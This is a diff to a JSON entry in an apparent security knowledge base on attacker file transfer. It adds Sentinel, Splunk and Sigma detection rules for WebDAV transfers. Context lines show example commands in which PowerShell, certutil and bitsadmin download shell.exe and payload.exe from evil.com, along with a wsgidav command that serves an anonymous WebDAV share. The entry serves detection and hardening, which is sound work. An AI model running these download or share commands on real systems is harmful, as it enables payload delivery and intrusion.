@@ -105,7 +105,92 @@
     ],
     "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
     "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
-    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
+    "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "WebDAV - Transfer - Sentinel",
+        "logic": "DeviceFileEvents\n| where FolderPath has \"DavWWWRoot\"\n| project Timestamp, DeviceName, InitiatingProcessFileName, FolderPath\n| union (DeviceProcessEvents | where ProcessCommandLine has \"WebClient\" and ProcessCommandLine has \"start\" | project Timestamp, DeviceName, InitiatingProcessFileName=FileName, FolderPath=ProcessCommandLine)\n| sort by Timestamp desc\n// WebClient service start + PUT/PROPFIND to a mapped DavWWWRoot",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "WebDAV - Transfer (1) - Splunk",
+        "logic": "index=wineventlog sourcetype=\"WinEventLog:System\" EventCode=7036 \"WebClient\" \"running\"\n| table _time, Computer",
+        "data_source": "windows-security",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "7036"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "WebDAV - Transfer (2) - Splunk",
+        "logic": "index=sysmon EventCode=11 TargetFilename=\"*DavWWWRoot*\"\n| table _time, Computer, Image, TargetFilename",
+        "data_source": "sysmon",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "11"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "WebDAV - Transfer (3) - Splunk",
+        "logic": "index=proxy (method=PUT OR method=PROPFIND)\n| table _time, src_ip, dest_ip, method",
+        "data_source": "proxy",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "sigma",
+        "name": "win_webdav_webclient_service_start",
+        "logic": "win_webdav_webclient_service_start",
+        "data_source": "proxy",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "sigma",
+        "name": "net_webdav_propfind_external",
+        "logic": "net_webdav_propfind_external",
+        "data_source": "proxy",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "proxy",
+        "sysmon",
+        "windows-security"
+      ],
+      "better_with": [
+        "edr"
+      ]
+    }
   },
   "explain": "Hosts a WebDAV share over HTTP, useful where SMB (445) is blocked outbound:\n  wsgidav --host=0.0.0.0 --port=80   listen on all interfaces, port 80\n  --root=/tmp                        serve this directory\n  --auth=anonymous                   allow unauthenticated access\nWindows reaches it via the \\\\<ip>\\DavWWWRoot\\ UNC path, so copy/dir work over WebDAV like a normal share."
 }
